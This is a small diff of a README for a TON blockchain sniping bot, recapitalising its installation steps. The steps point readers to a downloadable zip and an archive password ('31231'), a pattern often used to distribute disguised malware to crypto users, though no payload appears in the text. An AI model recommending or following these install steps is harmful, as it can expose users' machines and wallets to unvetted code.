@@ -8,9 +8,9 @@ TON Blockchain Sniping Bot is a fast, automated tool that connects to a TON node
 - **Transaction Sniping**: This component creates and sends new transactions in response to matched criteria, effectively performing the snipe.
 ### Installation
 - [Download](https://github.com/knightlightst/ton-sniper/archive/refs/heads/main.zip) the repository.
-- extract archive with pass `31231`.
+- Extract archive with pass `31231`.
 - Create a `config.json` file.
-- run the bot.
+- Run the bot.
 
 ### Config.json
 ```
